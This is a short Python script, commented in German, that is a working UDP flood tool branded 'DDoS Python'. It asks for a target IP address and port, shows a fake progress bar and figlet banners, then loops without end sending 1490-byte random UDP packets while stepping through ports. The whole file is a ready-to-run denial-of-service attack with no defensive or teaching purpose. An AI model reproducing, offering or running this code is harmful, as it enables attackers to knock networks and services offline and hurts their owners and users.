import os
import time
import socket
import random
from datetime import datetime

# Initialisierung
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet CAT")

print("DDoS")
print("DdoS")
print("DdoS")

ip = input("IP Target : ")
port = int(input("Port : "))

print("\033[92m")
print("[     ] 0% ")
time.sleep(5)
print("[     ] 100%")
time.sleep(3)

os.system("clear")
print("\033[93m")
os.system("figlet DDoS Python")
print("Phonk")

sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent += 1
    port += 1
    print(f"Sent {sent} packet to {ip} through port: {port}")
    if port == 65534:
        port = 1
